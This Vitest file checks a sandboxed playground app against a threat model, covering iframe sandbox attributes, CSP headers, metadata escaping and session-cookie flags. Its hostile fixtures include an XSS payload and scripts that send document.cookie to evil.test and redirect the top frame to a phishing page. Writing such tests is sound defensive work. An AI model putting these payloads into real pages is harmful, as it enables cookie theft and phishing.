import { describe, expect, it } from 'vitest';
import { makeApp } from '../app.js';
import { ProviderRegistry, ProviderId, SessionId, TurnId } from '../provider/index.js';
import type { SessionHandle } from '../provider/index.js';
import { makeMemoryArtifactStore, makeMemoryCatalog, makeMemoryReportStore, Tag } from '../storage/index.js';
import type { ArtifactStore, Catalog } from '../storage/index.js';
import { makeMemorySessionStore, passThroughValidator, Subject } from '../api/index.js';
import { makeFakeOAuthProvider } from '../api/__fixtures__/fakeOAuthProvider.js';
import { makeTestQuota } from '../api/__fixtures__/testQuota.js';
import { makeFrontDoorRouter } from './frontDoorRouter.js';
import { AppOrigin } from './originGuard.js';

// THE ADVERSARIAL ESCAPE-VECTOR MATRIX — the deterministic acceptance for the sandbox threat model
// (design-docs/threat-model-sandbox.md). Each test IS one vector from that model, seeded with a
// genuinely HOSTILE playground, asserting the enabling condition for the attack is ABSENT in the real
// response. These assert the security CONTRACT at the two-origin seam (headers, sandbox attributes,
// escaping, cookie posture) — the browser enforces, our contract is what we ship — so a regression
// that reopens any vector (e.g. someone adds `allow-same-origin`) turns a test red. This is the
// ticket's "a test playground attempting each escape vector demonstrably fails."
// [LAW:verifiable-goals] [LAW:behavior-not-structure] [LAW:single-enforcer]

const APP_ORIGIN = AppOrigin('https://app.tinkerpad.test');
const CONTENT_ORIGIN = 'https://content.tinkerpad.test';

// A prompt/tag an attacker would author to break OUT of the sandbox by getting code to run in the
// TRUSTED chrome around it (V6). If any app-origin callsite interpolates it unescaped, this exact
// substring appears executable in the served HTML.
const XSS_PROMPT = `"><img src=x onerror="fetch('https://evil.test?c='+document.cookie)">`;
// A DISTINCT hostile author, so author escaping is pinned INDEPENDENTLY of the prompt: unlike `Tag()`,
// `Subject()` is a pure brand with no normalization, so a hostile author is representable and escaping
// is its only defense. A regression in the author render path (but not the prompt path) must turn a
// test red — which it can't if the seeded author is safe. [LAW:types-are-the-program]
const XSS_AUTHOR_RAW = `<script>alert(2)</script>`;
// A tag CANNOT carry a payload: `Tag()` slugs its input at the type boundary, so this raw hostile
// string is stored as the inert `script-alert-1-script`. That normalization — not escaping — is the
// tag's containment. [LAW:types-are-the-program]
const XSS_TAG_RAW = `<script>alert(1)</script>`;
const XSS_TAG_SLUG = 'script-alert-1-script';

// A playground whose OWN html tries every in-frame escape: exfiltrate, hijack the top frame, read the
// parent. It is served raw and contained; these lines are what the sandbox + CSP must neutralize.
const HOSTILE_HTML = [
  '<!doctype html><html><body>',
  "<script>fetch('https://evil.test/steal', {method:'POST', body: document.cookie});</script>",
  "<script>top.location = 'https://evil.test/phish';</script>",
  "<script>try { parent.document.title = 'pwned'; } catch (e) {}</script>",
  '</body></html>',
].join('');

const handle = (): SessionHandle => ({
  providerId: ProviderId('fake'),
  sessionId: SessionId('s1'),
  turnId: TurnId('t1'),
});

// A memory-backed app in the SAME shape the edge builds — empty registry, no-op disposer, and SECURE
// cookies (secure: true), so the cookie posture asserted below is exactly the public deploy's.
const makeSecureApp = (): { catalog: Catalog; store: ArtifactStore; router: ReturnType<typeof makeFrontDoorRouter> } => {
  const store = makeMemoryArtifactStore();
  const catalog = makeMemoryCatalog();
  const app = makeApp({
    registry: new ProviderRegistry(),
    store,
    catalog,
    reportStore: makeMemoryReportStore(),
    sessionStore: makeMemorySessionStore({ now: () => Date.now(), ttlMs: 60_000 }),
    disposeTurn: async () => undefined,
    quota: makeTestQuota(),
    maxAttempts: 1,
    validateArtifact: passThroughValidator,
    now: () => Date.now(),
    oauth: makeFakeOAuthProvider({ subject: Subject('github:1') }),
    oauthCallbackUrl: `${APP_ORIGIN}/session/callback`,
    cookieSecurity: { secure: true },
    adminSubjects: new Set(),
  });
  const router = makeFrontDoorRouter({
    app,
    page: '<!doctype html><title>front door</title>front door',
    contentOrigin: CONTENT_ORIGIN,
    appOrigin: APP_ORIGIN,
  });
  return { catalog, store, router };
};

// Seed the hostile playground: hostile bytes AND hostile metadata (prompt, tag), so both the in-frame
// vectors and the chrome-XSS vector have a real payload to fail against.
const seedHostile = async (catalog: Catalog, store: ArtifactStore): Promise<string> => {
  const version = await store.put({ html: HOSTILE_HTML });
  const playground = await catalog.createPlayground({
    handle: handle(),
    prompt: XSS_PROMPT,
    version,
    lineage: null,
    author: Subject(XSS_AUTHOR_RAW),
    tags: [Tag(XSS_TAG_RAW)],
  });
  return playground.id;
};

// The content origin's sealed-response contract, asserted in ONE place: the full network-denying CSP
// (deny-all baseline, no exfil, no form post-out, no <base> hijack, no host ever re-permitted) plus
// nosniff. Every content-origin response — success AND error — must satisfy it, so both paths call
// this helper; a directive dropped on either path alone turns the test red, and the two paths cannot
// drift to different thoroughness. [LAW:single-enforcer] [LAW:one-source-of-truth]
const expectSealedCsp = (res: Response): void => {
  const csp = res.headers.get('content-security-policy') ?? '';
  expect(csp).toContain("default-src 'none'"); // deny-all baseline
  expect(csp).toContain("connect-src 'none'"); // no fetch/XHR/WebSocket/beacon exfil
  expect(csp).toContain("form-action 'none'"); // no form post-out
  expect(csp).toContain("base-uri 'none'"); // no <base> hijack
  // Only the app's player may frame a playground (R4) — a third party cannot hotlink/embed it. The app
  // origin appears ONLY here, so strip this framing-control directive before asserting no host leaks
  // into a RESOURCE-load directive (the original network-denying guarantee, now stated precisely).
  expect(csp).toContain(`frame-ancestors ${APP_ORIGIN}`);
  const withoutFrameAncestors = csp.replace(`frame-ancestors ${APP_ORIGIN}`, '');
  expect(withoutFrameAncestors).not.toContain("'self'"); // no host may be re-permitted for a load
  expect(withoutFrameAncestors).not.toContain('http'); // no external origin for any subresource, ever
  expect(res.headers.get('x-content-type-options')).toBe('nosniff');
};

describe('sandbox escape vectors — a hostile playground demonstrably fails each', () => {
  // V1 + V3 + V7: the player frames the untrusted content with an OPAQUE origin (no allow-same-origin
  // ⇒ no reach to the app origin, cookies, or parent) and NO top-navigation (⇒ no phishing redirect).
  // This pins the iframe half of the boundary: adding `allow-same-origin` here silently collapses the
  // sandbox, and this assertion is what catches it.
  it('frames the playground with sandbox="allow-scripts" and NOT allow-same-origin or top-navigation', async () => {
    const { catalog, store, router } = makeSecureApp();
    const id = await seedHostile(catalog, store);
    const res = await router(new Request(`${APP_ORIGIN}/play?id=${encodeURIComponent(id)}`));
    expect(res.status).toBe(200);
    const body = await res.text();

    const iframe = /<iframe[\s\S]*?<\/iframe>/.exec(body)?.[0] ?? '';
    expect(iframe).toContain('sandbox="allow-scripts"');
    // R4: an explicit deny-all permissions policy — no powerful feature is delegated to the frame.
    // Belt-and-suspenders over the opaque sandbox, so it survives a future sandbox-attribute change.
    expect(iframe).toContain('allow=""');
    // The load-bearing ABSENCES — each token would reopen a vector.
    expect(iframe).not.toContain('allow-same-origin'); // V1: opaque origin, no reach to app/parent
    expect(iframe).not.toContain('allow-top-navigation'); // V3: no phishing redirect of the top frame
    expect(iframe).not.toContain('allow-popups'); // V7: no popup handle
    expect(iframe).toContain('referrerpolicy="no-referrer"');
    // The frame points at the CONTENT origin (opaque, foreign) — never inlines the raw html.
    expect(iframe).toContain(`src="${CONTENT_ORIGIN}`);
  });

  // V4: every content-origin response is SEALED under the network-denying CSP + nosniff, so fetch,
  // WebSocket, beacons, external subresources, form post-out, and <base> hijack are all denied.
  it('seals every content-origin response under the network-denying CSP + nosniff', async () => {
    const { catalog, store, router } = makeSecureApp();
    const id = await seedHostile(catalog, store);

    const ok = await router(new Request(`${CONTENT_ORIGIN}/?id=${encodeURIComponent(id)}`));
    expectSealedCsp(ok);
    // The raw hostile bytes ARE served here (live code) — containment is the CSP + opaque frame, not
    // escaping. Proven byte-for-byte so we know the payload is real, not neutered at the source.
    expect(await ok.text()).toBe(HOSTILE_HTML);

    // Error responses stay sealed too — there is no permissive path out of the content origin. Asserted
    // through the SAME helper as success, so the error path cannot carry a weaker CSP than the 200 path.
    const missing = await router(new Request(`${CONTENT_ORIGIN}/?id=nope`));
    expect(missing.status).toBe(404);
    expectSealedCsp(missing);
  });

  // V5: the app host has NO raw-html route. Requesting the id on the app origin yields the front door,
  // never the hostile bytes — the playground can never land same-origin with the app.
  it('never serves raw playground bytes on the app origin', async () => {
    const { catalog, store, router } = makeSecureApp();
    const id = await seedHostile(catalog, store);
    const res = await router(new Request(`${APP_ORIGIN}/?id=${encodeURIComponent(id)}`));
    expect(res.status).toBe(200);
    const body = await res.text();
    expect(body).toContain('front door');
    expect(body).not.toContain('evil.test'); // the hostile bytes are nowhere on the app origin
  });

  // V6 — the highest-value class: hostile METADATA rendered into trusted chrome must be escaped, or it
  // executes on the app origin OUTSIDE the iframe, bypassing the whole sandbox. Assert on both surfaces
  // the metadata appears (player + commons).
  it('escapes hostile playground metadata everywhere it renders in trusted chrome', async () => {
    const { catalog, store, router } = makeSecureApp();
    const id = await seedHostile(catalog, store);

    for (const path of [`/play?id=${encodeURIComponent(id)}`, '/commons']) {
      const res = await router(new Request(`${APP_ORIGIN}${path}`));
      expect(res.status).toBe(200);
      const body = await res.text();
      // The raw executable forms must never appear anywhere on the trusted origin.
      expect(body).not.toContain('<img src=x onerror=');
      expect(body).not.toContain('<script>alert(1)</script>');
      expect(body).not.toContain('<script>alert(2)</script>');
      // The PROMPT is free attacker text, contained by ESCAPING — it renders as inert text.
      expect(body).toContain('&lt;img src=x onerror=');
      // The AUTHOR is ALSO free attacker text (Subject is an un-normalized brand), pinned
      // independently of the prompt so a regression in the author render path alone turns this red.
      expect(body).toContain('&lt;script&gt;alert(2)&lt;/script&gt;');
      // The TAG is contained by NORMALIZATION at the Tag() brand — the payload is gone before storage,
      // so it renders as an inert slug, never an escaped-payload. [LAW:types-are-the-program]
      expect(body).toContain(XSS_TAG_SLUG);
    }
  });

  // V2: the session credential the whole app protects is minted HARDENED — HttpOnly (no script can read
  // it, on any origin), SameSite=Strict (never sent cross-site — the CSRF defense), Secure + __Host-
  // (host-scoped, unreachable from the content origin). Driven through the real login dance on the app
  // host, so this is the posture the public deploy actually ships.
  it('mints a session cookie that is HttpOnly, SameSite=Strict, Secure, and __Host- scoped', async () => {
    const { router } = makeSecureApp();

    const login = await router(new Request(`${APP_ORIGIN}/session/login`, { redirect: 'manual' }));
    const stateCookie = login.headers.getSetCookie().find((c) => c.startsWith('__Host-tp_oauth_state='));
    expect(stateCookie).toBeDefined();
    const state = /__Host-tp_oauth_state=([^;]*)/.exec(stateCookie!)![1]!;

    const callback = await router(
      new Request(`${APP_ORIGIN}/session/callback?code=any&state=${state}`, {
        headers: { cookie: `__Host-tp_oauth_state=${state}` },
        redirect: 'manual',
      }),
    );
    const sessionCookie = callback.headers.getSetCookie().find((c) => c.startsWith('__Host-tp_session='));
    expect(sessionCookie).toBeDefined();
    expect(sessionCookie).toContain('HttpOnly');
    expect(sessionCookie).toContain('SameSite=Strict');
    expect(sessionCookie).toContain('Secure');
    // Path=/ is REQUIRED by the __Host- prefix — a browser rejects a __Host- cookie without it, so a
    // missing Path would silently leave the user with no session. Asserted so the prefix is valid, not
    // just present.
    expect(sessionCookie).toContain('Path=/');
    // __Host- prefix + no Domain ⇒ host-scoped: the content origin can never receive it.
    expect(sessionCookie).not.toMatch(/Domain=/i);
  });
});
